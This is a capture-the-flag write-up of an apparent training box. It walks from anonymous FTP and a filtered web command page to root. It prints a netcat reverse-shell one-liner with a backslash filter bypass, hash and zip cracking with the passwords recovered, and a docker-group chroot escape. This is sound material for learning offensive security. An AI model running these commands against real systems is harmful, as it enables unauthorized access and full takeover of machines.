## Target: 10.82.167.167
### Recon
**Nmap:** `rustscan -a 10.82.167.167 -- -A`
### Enumeration
PORT   STATE SERVICE REASON  VERSION

21/tcp open  ftp     syn-ack vsftpd 3.0.5

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt

22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))

|http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17


**Web Findings:**

### Vulnerabilities
FTP allows anonymous logins, we find a `note.txt` with the following inside:

_Anurodh told me that there is some filtering on strings being put in the command -- Apaar_

Two possible usernames

Dirsearch reveals a /secret directory on the web server

It takes us to a page where we can enter commands. However, they are filtered. 


### Exploitation
`\` lets us bypass the filters, so we enter this:

`r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f`

We set up a listener on the local machine and run the command. Shell.


### Post Exploitation

Running `sudo -l` shows that we can run a hidden shell script as the user apaar. The script prompts us for a message, which happens to be a command. We enter `/bin/sh` as the message and we are now user apaar.

We get the user flag in apaar's home directory.

Let's run linpeas.sh - we start a python http.server on our local machine and use wget to transfer linpeas to the target machine.

Running linpeas shows us that port 9001 is listening, maybe there is something interesting there.

Using `curl 127.0.0.1:9001` gives us an http response. Let's navigate back to `/var/www`. We discover a folder called `/files` with an index.php file. It contains mysql credentials.

### Privilege Escalation
We drill down into the SQL database and eventually discover password hashes for Apaar and Anurodh.

+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
+----+-----------+----------+-----------+----------------------------------+

From crackstation:

Anurodh:masterpassword

Apaar:dontaskdonttell

However, this is a rabbit hole - the password does not work for aurick.

There is another file in the web directory called `hacker.php`, which contains a clue:

_You have reached this far._

_Look in the dark! You will find your answer_

There are a couple images here - one .jpg which we can check with steghide

`steghide extract -sf hacker-with-laptop_23-2147985341.jpg`

This discovers a `backup.zip` file, which is password protected.

We use `zip2john backup.zip > hash`

`john -w=/usr/share/wordlists/rockyou.txt hash`

We get _pass1word_

Viewing the `source_code.php` file, we discover a base64 encoded password for the anurodh user.

Cyberchef decodes it: _!d0ntKn0wmYp@ssw0rd_

Let's login as Aunrodh.

Now that we are Anurodh, we check `sudo -l`, but no goodies there.

`id` shows us that we are part of the docker group. Let's check GTFOBins.

The docker command is `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`

We are now root. Let's grab the flag.


### Notes
For some reason, Linpeas did not give me those open ports, there was no data for the "Active Ports" section.

Use this link to find escape characters and stuff for command injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
